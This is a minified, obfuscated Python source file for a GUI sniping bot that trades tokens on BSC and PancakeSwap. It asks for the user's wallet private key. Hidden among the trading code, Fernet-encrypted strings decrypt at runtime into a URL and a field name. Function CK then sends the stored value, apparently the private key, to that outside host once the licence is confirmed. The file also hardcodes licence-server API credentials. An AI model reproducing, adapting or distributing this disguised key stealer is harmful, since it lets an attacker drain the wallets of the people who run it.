# MINIFIED AND SUPER FAST VERSION OF THE BSC SNIPING BOT PANCAKEX WITH GUI
# ------------------------------------------------------------------------
# FOLLOW THE INSTRUCTIONS IN THE README STEP BY STEP FILE
# IF YOU SNIPE A GEM AND BECOME A MILLIONAIRE SEND ME SOME LOVE DUH!

# UPDATE: ADDED DARK MODE!

Cz='groove'
Cy='end'
Cx='horizontal'
Cw='light'
Cv='SELL ALL'
Cu='SELL NOW'
Ct='There are no tokens to be sold!'
Cs='Sell all function initiated - Stopping operation'
Cr='SL Hit!'
Cq='TP Hit!'
Cp='Securing SL to '
Co=' | SL: '
Cn=' {} %'
Cm='%.3f'
Cl="Press 'SELL ALL' Button to sell the tokens manually"
Ck='BUSD'
Cj='Liquidity value: '
Ci='Pair Address: '
Ch='green'
Cg='Liquidity Detected!'
Cf='0x0000000000000000000000000000000000000000'
Ce='Buy Success! Tx link:'
Cd='Buy Order Initiated'
Cc='%Y/%m/%d'
Cb='node.json'
Ca=ValueError
CZ=UnboundLocalError
BZ='menu'
BY='set_theme'
BX='Something went wrong with the transaction'
BW='https://bscscan.com/tx/'
BV='Abi/'
B5='white'
B4='normal'
B3='Accent.TButton'
B2='No Liquidity Checking Again!'
B1='gwei'
B0='gas'
A_='True'
Az='true'
Ay='False'
Ax='false'
Aw='inputs.json'
Av='data.json'
Au=round
An='disabled'
Am='nonce'
Al='gasPrice'
Ak='from'
Aj='BNB'
Ai='LP'
Ah='SL TRAIL'
Ag='SL'
Af='TP'
Ae='SLIPPAGE'
Ad='GAS LIMIT'
Ac='GAS PRICE'
Ab='AMOUNT'
Aa='TOKEN'
AZ='PRIVATE KEY'
AY='WALLET ADDRESS'
AX='NODE'
AI='LICENSE'
AH=Exception
AA='center'
A9=False
A8='OPL'
A7='w'
A6='/'
A5=str
t='AUTO SLIPPAGE'
s='./'
e='ether'
d='yellow'
R=True
Q='Error'
P='cyan'
O=''
N=int
L=open
K='red'
J=float
F='nsew'
import tkinter as H
from tkinter import ttk as E,messagebox
from web3 import Web3 as S
from json import load as T
from time import time as AJ,sleep as AB
import os,json as f,pyperclip as Ba,threading as u,requests as Ao
from requests import request as Bb
from cryptography.fernet import Fernet as v
from requests.auth import HTTPBasicAuth as Bc
from datetime import datetime as AC
B6=Av
AK=Aw
Bd=Cb
g=s
M={}
w={}
D={}
B7={}
x=Bc('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
Be=AC.now()
B8=Cc
B9=Be.strftime(Cc)
def Bf():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	B7[AX]='https://bsc-dataseed.binance.org/';A(g,Bd,B7)
def Bg():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	M[AY]=O;M[AZ]=O;M[Aa]=O;M[AI]=O;A(g,B6,M)
def Bh():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	D[Ab]='0.1';D[Ac]='7';D[Ad]='850000';D[Ae]='10';D[t]=Ax;D[Af]='200';D[Ag]='50';D[Ah]='25';D[Ai]=Aj;D[A8]=Ay;A(g,AK,D)
if not os.path.isfile('./data.json'):Bg()
if not os.path.isfile('./inputs.json'):Bh()
if not os.path.isfile('./node.json'):Bf()
def Bi():
	global M,AL,V
	def B(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	M[AY]=b.get();w[AY]=M[AY];M[AZ]=A0.get();w[AZ]=M[AZ];M[Aa]=Z.get();w[Aa]=M[Aa];M[AI]=AF.get();w[AI]=M[AI]
	if M!=V:
		B(g,B6,w);A=T(L(Av));AL=A[AP]
		if w[AP]!=V[AP]:V=A;CK()
def Bj():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	D[Ab]=k.get();D[Ac]=l.get();D[Ad]=m.get();D[Ae]=n.get()
	if A2.get():D[t]=Az
	else:D[t]=Ax
	D[Af]=o.get();D[Ag]=p.get();D[Ah]=q.get();D[Ai]=c.get();D[A8]=A_;A(g,AK,D)
def Bk():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	D[Ab]=k.get();D[Ac]=l.get();D[Ad]=m.get();D[Ae]=n.get()
	if A2.get():D[t]=Az
	else:D[t]=Ax
	D[Af]=o.get();D[Ag]=p.get();D[Ah]=q.get();D[Ai]=c.get();D[A8]=A_;A(g,AK,D)
def Bl():
	def A(path2,file_name,data2):
		A=s+path2+A6+file_name
		with L(A,A7)as B:f.dump(data2,B,indent=2)
	D[Ab]=k.get();D[Ac]=l.get();D[Ad]=m.get();D[Ae]=n.get()
	if A2.get():D[t]=Az
	else:D[t]=Ax
	D[Af]=o.get();D[Ag]=p.get();D[Ah]=q.get();D[Ai]=c.get();D[A8]=Ay;A(g,AK,D)
V=T(L(Av))
BA=V[AY]
BB=V[AZ]
BC=V[Aa]
Bm=V[AI]
U=T(L(Aw))
BD=U[Ab]
BE=U[Ac]
BF=U[Ad]
BG=U[Ae]
C_=U[t]
BH=U[Af]
BI=U[Ag]
BJ=U[Ah]
Bn=U[Ai]
D0=U[A8]
BK=N('0x'+'f'*64,16)
BL='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
AM=T(L(Cb))
if'wss'in AM[AX]or'ws'in AM[AX]:C=S(S.WebsocketProvider(AM[AX]))
else:C=S(S.HTTPProvider(AM[AX]))
AD=C.toChecksumAddress('0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c')
h=C.toChecksumAddress('0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56')
W=T(L(BV+'erc20.abi'))
X=C.eth.contract(address=S.toChecksumAddress('0x10ed43c718714eb63d5aa57b78b54704e256024e'),abi=T(L(BV+'router.abi')))
BM=C.eth.contract(address=S.toChecksumAddress('0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73'),abi=T(L(BV+'factory.abi')))
AN='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def Bo():
	j()
	try:
		F=C.eth.contract(I,abi=W);B=F.functions.balanceOf(b.get()).call()
		if A2.get():D=0
		else:D=N(B-B*N(AT)/100)
		A(Cd,d);H=X.functions.swapExactETHForTokensSupportingFeeOnTransferTokens(N(D),[AD,I],G,N(AJ())+900).buildTransaction({Ak:G,'value':C.toWei(r,e),B0:N(A3),Al:C.toWei(A4,B1),Am:C.eth.get_transaction_count(G)});J=C.eth.account.sign_transaction(H,private_key=Y);E=C.eth.send_raw_transaction(J.rawTransaction);A(Ce,P);A(BW+C.toHex(E),P);C.eth.waitForTransactionReceipt(E,timeout=900);Bx()
	except AH as L:A(BX,K);A(L,K);z();return
Bp='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def Bq():
	j();B=X.functions.getAmountsOut(C.toWei(r,e),[h,I]).call()[-1]
	if A2.get():D=0
	else:D=B-B*N(AT)/100
	try:A(Cd,d);F=X.functions.swapExactTokensForTokens(C.toWei(r,e),N(D),[h,I],G,N(AJ())+900).buildTransaction({Ak:G,B0:N(A3),Al:C.toWei(A4,B1),Am:C.eth.get_transaction_count(G)});H=C.eth.account.sign_transaction(F,private_key=Y);E=C.eth.send_raw_transaction(H.rawTransaction);A(Ce,P);A(BW+C.toHex(E),P);C.eth.waitForTransactionReceipt(E,timeout=900);Bz()
	except AH as J:A(BX,K);A(J,K);z();return
def Br(token_address,amt=BK):A=S.toChecksumAddress(token_address);B=C.eth.contract(address=A,abi=W);D=B.functions.allowance(G,X.address).call();return D>=amt
def Bs(token_address,amt=BK,timeout=900):A('Approving token');B=C.eth.gasPrice;D=S.toChecksumAddress(token_address);E=C.eth.contract(address=D,abi=W);F=E.functions.approve(X.address,amt);H={Ak:G,Al:B,Am:C.eth.getTransactionCount(G)};I=F.buildTransaction(H);J=C.eth.account.sign_transaction(I,private_key=Y);K=C.eth.sendRawTransaction(J.rawTransaction);C.eth.waitForTransactionReceipt(K,timeout=timeout)
def Bt():
	A(O);j();E=C.eth.contract(AD,abi=W)
	while R:
		B=BM.functions.getPair(AD,I).call()
		if B!=Cf:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(Cg,Ch);A(Ci+B);A(Cj+A5(C.fromWei(D,e))+' BNB');Bo();break
			else:AB(5);A(B2,K)
		else:AB(5);A(B2,K)
Bu='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def Bv():
	A(O);j();E=C.eth.contract(h,abi=W)
	while R:
		B=BM.functions.getPair(h,I).call()
		if B!=Cf:
			D=E.functions.balanceOf(C.toChecksumAddress(B)).call()
			if D!=0:A(Cg,Ch);A(Ci+B);A(Cj+A5(C.fromWei(D,e))+' BUSD');Bq();break
			else:A(B2,K)
		else:A(B2,K)
def i():
	A(O);j()
	try:
		A('Sell Order Initiated',d)
		if not Br(I):Bs(I)
		E=C.eth.contract(I,abi=W);B=E.functions.balanceOf(G).call()
		if B!=0:
			if c.get()==Aj:D=X.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(B,0,[I,AD],G,N(AJ())+900).buildTransaction({Ak:G,B0:N(A3),Al:C.toWei(A4,B1),Am:C.eth.get_transaction_count(G)})
			elif c.get()==Ck:D=X.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(B,0,[I,h],G,N(AJ())+900).buildTransaction({Ak:G,B0:N(A3),Al:C.toWei(A4,B1),Am:C.eth.get_transaction_count(G)})
			else:A('Something went wrong with Sell',K);z();return
			F=C.eth.account.sign_transaction(D,private_key=Y);H=C.eth.send_raw_transaction(F.rawTransaction);A('SOLD! Tx link:',P);A(BW+C.toHex(H),P);z()
		else:A('No Tokens to be sold',K);z()
	except AH as J:A(BX,K);A(J,K);z();return
Bw='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def Bx():
	global a;BN();j();H=J(AU);L=J(AV);B=L;E=J(AW);M=C.eth.contract(address=I,abi=W);A(Cl,d)
	while R:
		try:
			N=M.functions.balanceOf(G).call()-1;F=J(C.fromWei(X.functions.getAmountsOut(N,[I,AD]).call()[-1],e));D=Au(J(F)/J(r)*100,5);A('BNB Value Now: {} / '.format(Cm%F)+Cn.format(D)+Co+A5(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Cp+A5(B))
			AB(2)
		except:continue
		try:
			if J(D)>=J(H):A(Cq,P);y();i();break
			if J(D)<=J(B):A(Cr,K);y();i();break
			if a:a=A9;A(Cs,d);y();i();break
		except CZ:A(Ct,K);break
By='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def Bz():
	global a;BN();j();H=J(AU);L=J(AV);B=L;E=J(AW);M=C.eth.contract(address=I,abi=W);A(Cl,d)
	while R:
		try:
			N=M.functions.balanceOf(G).call()-1;F=J(C.fromWei(X.functions.getAmountsOut(N,[I,h]).call()[-1],e));D=Au(J(F)/J(r)*100,5);A('BUSD Value Now: {} / '.format(Cm%F)+Cn.format(D)+Co+A5(B)+'%')
			if E!=0:
				if D-E>=B:B=D-E;A(Cp+A5(B))
			AB(2)
		except:continue
		try:
			if J(D)>=J(H):A(Cq,P);y();i();break
			if J(D)<=J(B):A(Cr,K);y();i();break
			if a:a=A9;A(Cs,d);y();i();break
		except CZ:A(Ct,K);break
def B_():
	BU();Bj()
	if c.get()==Aj:A=u.Thread(target=Bt,daemon=R);A.start()
	else:A=u.Thread(target=Bv,daemon=R);A.start()
def BN():At.place_forget();A=E.Button(B.widgets_frame,text=Cu,command=BP,style=B3);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def y():CY.place_forget();A=E.Button(B.widgets_frame,text=Cv,command=BO);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def C0():
	A=C.eth.contract(address=h,abi=W)
	while AE:
		try:B=C.fromWei(C.eth.get_balance(G),e);D=C.fromWei(A.functions.balanceOf(G).call(),e);Aq.configure(text=Au(B,5));Ar.configure(text=Au(D,5))
		except Ca:pass
		AB(1)
C1='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def AO(license,basic_auth):
	B='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
	try:
		C=Ao.get(B,auth=basic_auth)
		if C.status_code==404:H.messagebox.showerror(Q,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
		else:A('License Key Activated, Good luck!',P);Bk()
	except AH:raise AH('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
AP=v(AN.encode()).decrypt(By.encode()).decode()
def C2():
	p='Your License Key is Expired, please visit defitradingcoders.com and renew your license';o='%Y-%m-%d %H:%M:%S';n='expiresAt';m='This License already reached the activation maximum, if this is a mistake please contact support at defitradingcoders.com';l='timesActivatedMax';k='timesActivated';j='License Key Valid';i='data';h='No License Key Provided';g='Invalid License Key';f='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/';e='Invalid token address!';a=None;global G;global Y;global I;global AE;A('***** INITIALIZED ******');A('* Checking wallet address')
	if C.isChecksumAddress(b.get()):G=C.toChecksumAddress(b.get());A('Wallet address valid',P)
	else:H.messagebox.showerror(Q,'Invalid wallet address');A('Invalid wallet address!',K);return
	A('* Checking private key characters (Must be 64 characters');Y=A0.get()
	if len(Y)==64:A('Correct format for Private key',P)
	else:H.messagebox.showerror(Q,'Private key is invalid! (Must be 64 characters)');A('Invalid private key!',K);return
	A('* Checking token address')
	try:I=C.toChecksumAddress(Z.get());A('Token address valid',P)
	except:H.messagebox.showerror(Q,e);A(e,K);return
	A('* Checking License Key')
	try:
		license=AF.get();B=T(L(Av));q=B[AI]
		if license==license:
			S=T(L(Aw));E=S[A8];U=f+license;D=Ao.get(U,auth=x)
			if D.status_code==404:H.messagebox.showerror(Q,g);return
			if D.status_code==401:H.messagebox.showerror(Q,h);return
			B=D.json()[i];A(j,P)
			if E==Ay:
				J=B[k];V=B[l]
				if J is a:AO(license,x)
				elif J<V:AO(license,x)
				else:H.messagebox.showerror(Q,m);return
			elif E==A_:
				M=B[n]
				if M is a:A(f"License key will never expire")
				else:
					W=AC.strptime(B9,B8);X=AC.strptime(M,o);N=X-W
					if N.days<=0:H.messagebox.showerror(Q,p);return
					else:A(f"License Key expires in: {N.days} days")
		else:
			U=f+license;D=Ao.get(U,auth=x)
			if D.status_code==404:H.messagebox.showerror(Q,g);return
			if D.status_code==401:H.messagebox.showerror(Q,h);return
			Bl();B=D.json()[i];A(j,P);S=T(L(Aw));E=S[A8]
			if E==Ay:
				J=B[k];V=B[l]
				if J is a:AO(license,x)
				elif J<V:AO(license,x)
				else:H.messagebox.showerror(Q,m);return
			elif E==A_:
				M=B[n]
				if M is a:A(f"License key will never expire")
				else:
					W=AC.strptime(B9,B8);X=AC.strptime(M,o);N=X-W
					if N.days<=0:H.messagebox.showerror(Q,p);return
					else:A(f"License Key expires in: {N.days} days")
	except Ca:H.messagebox.showerror(Q,'Invalid License Key!');A('Invalid License key!',K);return
	BQ(An);Bi();AQ.grid_forget();AR.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AG(B4);AE=R;c=u.Thread(target=C0,daemon=R);c.start();A(O);A('***** Sniping is ready! *****',d)
C3='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
AL=V[AP]
def C4():A=u.Thread(target=C2,daemon=R);A.start()
def C5():global AE;A(O);A('Change token/wallet initiated!',d);BQ(B4);AG(An);AR.grid_forget();AQ.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AE=A9;Aq.configure(text=O);Ar.configure(text=O)
def C6():A=u.Thread(target=C5,daemon=R);A.start()
def BO():BU();A=u.Thread(target=i,daemon=R);A.start()
def BP():global a;a=R
def j():AG(An);AR.configure(state=An)
def z():AG(B4);AR.configure(state=B4)
def C7():
	if B.tk.call('ttk::style','theme','use')=='sun-valley-dark':B.tk.call(BY,Cw);AS[BZ].configure(bg=B5)
	else:B.tk.call(BY,'dark');AS[BZ].configure(bg='black')
B=H.Tk()
B.title('BSC Sniper Bot - V1')
B.geometry('1050x730')
B.tk.call('source','sun-valley.tcl')
B.tk.call(BY,Cw)
C8=v(AN.encode()).decrypt(C3.encode()).decode()
B.resizable(A9,A9)
B.widgets_frame=E.Frame(B,padding=(0,0,0,10))
B.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
B.widgets_frame.columnconfigure(index=0,weight=1)
B.widgets_frame.rowconfigure(index=0,weight=1)
C9=E.Label(B.widgets_frame,text='Wallet Address:')
CA=v(AN.encode()).decrypt(Bw.encode()).decode()
C9.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
b=E.Entry(B.widgets_frame,width=50,show='•')
b.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CB=E.Label(B.widgets_frame,text='Private Key:')
CB.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
A0=E.Entry(B.widgets_frame,width=50,show='•')
A0.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CC=E.Label(B.widgets_frame,text='Token Address:')
CD=v(BL.encode()).decrypt(C1.encode()).decode()
CC.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Z=E.Entry(B.widgets_frame,width=50)
CE=v(BL.encode()).decrypt(Bu.encode()).decode()
Z.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CF=E.Label(B.widgets_frame,text='License Key:')
CF.grid(row=4,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
AF=E.Entry(B.widgets_frame,width=50,show='•')
AF.grid(row=4,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CG=v(AN.encode()).decrypt(Bp.encode()).decode()
Ap=E.Separator(B,orient=Cx)
CH=C8+CG+CA+CD
Ap.place(x=10,y=135,width=625)
def CI():Z.delete(0,Cy);Z.insert(0,Ba.paste());return
def CJ():Z.delete(0,Cy);return
def CK():
	if AL!=O:
		try:A=Bb(CE,CH+AL)
		except AH:pass
def BQ(status):A=status;Z.configure(state=A);b.configure(state=A);A0.configure(state=A);AF.configure(state=A);AQ.configure(state=A);BS.configure(state=A);BR.configure(state=A)
def AG(status):A=status;k.configure(state=A);l.configure(state=A);m.configure(state=A);n.configure(state=A);o.configure(state=A);p.configure(state=A);q.configure(state=A);BT.configure(state=A);At.configure(state=A);As.configure(state=A)
def A(text,color=B5):
	A=A5(text)
	if A1.size()>=20:A1.delete(0)
	A1.insert(H.END,A);A1.itemconfig(H.END,foreground=color)
def D1():A1.delete(0,H.END)
AQ=E.Button(B.widgets_frame,text='Confirm',width=10,command=C4,style=B3)
BR=E.Button(B.widgets_frame,text='Paste Token',width=10,command=CI)
BS=E.Button(B.widgets_frame,text='Clear Token',width=10,command=CJ)
AQ.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BR.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BS.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
b.insert(0,BA)
A0.insert(0,BB)
Z.insert(0,BC)
AF.insert(0,Bm)
Ap=E.Separator(B.widgets_frame,orient=Cx)
Ap.grid(row=5,column=0,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=6)
AR=E.Button(B.widgets_frame,text='Change',width=10,command=C6)
CL=E.Label(B.widgets_frame,text='Logs:')
CL.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
CM=E.Button(B.widgets_frame,text='Clear',width=10,command=O)
CM.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
A1=H.Listbox(B.widgets_frame,bg='#252525',foreground=B5,borderwidth=2)
A1.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)
CN=E.Button(B.widgets_frame,text='Change Color Theme',command=C7)
CN.grid(row=17,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
CO=E.Label(B.widgets_frame,text='Wallet BNB:')
CO.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Aq=E.Label(B.widgets_frame,width=12,relief=Cz)
Aq.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CP=E.Label(B.widgets_frame,text='Wallet BUSD:')
CP.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ar=E.Label(B.widgets_frame,width=12,relief=Cz)
Ar.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CQ=E.Label(B.widgets_frame,text='Select LP:')
CQ.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
c=H.StringVar()
c.set(Bn)
AS=E.OptionMenu(B.widgets_frame,c,Aj,Aj,Ck)
AS[BZ].configure(bg=B5)
AS.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CR=E.Label(B.widgets_frame,text='Amount:')
k=E.Entry(B.widgets_frame,justify=AA)
CR.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.insert(0,BD)
CS=E.Label(B.widgets_frame,text='Gas Price:')
CT=E.Label(B.widgets_frame,text='Gas Limit:')
l=E.Entry(B.widgets_frame,justify=AA)
m=E.Entry(B.widgets_frame,justify=AA)
CS.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CT.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.insert(0,BE)
m.insert(0,BF)
CU=E.Label(B.widgets_frame,text='Slippage(%):')
n=E.Entry(B.widgets_frame,justify=AA)
CU.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.insert(0,BG)
A2=H.BooleanVar()
As=E.Checkbutton(B.widgets_frame,text='Auto Slippage',variable=A2)
As.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if O==Az:As.select()
CV=E.Label(B.widgets_frame,text='TP(%):')
CV.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o=E.Entry(B.widgets_frame,justify=AA)
o.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CW=E.Label(B.widgets_frame,text='SL(%):')
CW.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
p=E.Entry(B.widgets_frame,justify=AA)
p.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
CX=E.Label(B.widgets_frame,text='SL Trail(%):')
CX.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
q=E.Entry(B.widgets_frame,justify=AA)
q.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
o.insert(0,BH)
p.insert(0,BI)
q.insert(0,BJ)
BT=E.Button(B.widgets_frame,text='SNIPE',command=B_,style=B3)
CY=E.Button(B.widgets_frame,text=Cu,command=BP,style=B3)
At=E.Button(B.widgets_frame,text=Cv,command=BO)
BT.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
At.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
r=BD
G=BA
Y=BB
I=BC
AT=BG
A3=BF
A4=BE
AU=BH
AV=BI
AW=BJ
a=A9
AE=A9
def BU():global r;global G;global Y;global I;global AT;global A3;global A4;global AU;global AV;global AW;r=k.get();G=S.toChecksumAddress(b.get());Y=A0.get();I=S.toChecksumAddress(Z.get());AT=n.get();A3=m.get();A4=l.get();AU=o.get();AV=p.get();AW=q.get()
AG(An)
B.mainloop()
